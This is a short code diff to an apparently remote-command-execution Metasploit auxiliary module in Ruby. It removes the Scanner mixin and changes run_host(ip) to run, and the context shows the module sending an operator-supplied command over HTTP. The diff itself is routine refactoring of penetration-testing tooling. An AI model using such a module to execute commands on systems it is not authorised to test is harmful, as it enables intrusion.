@@ -3,7 +3,6 @@ require 'msf/core'
 class Metasploit3 < Msf::Auxiliary
 	Rank = ExcellentRanking
 	include Msf::Exploit::Remote::HttpClient
-	include Msf::Auxiliary::Scanner
 
 	def initialize(info = {})
 		super(update_info(info,
@@ -34,7 +33,7 @@ class Metasploit3 < Msf::Auxiliary
 			], self.class)
 	end
 
-	def run_host(ip)
+	def run
 		begin
 			print_status("#{rhost}:#{rport} - Sending remote command: " + datastore['CMD'])
 			res = send_request_cgi(
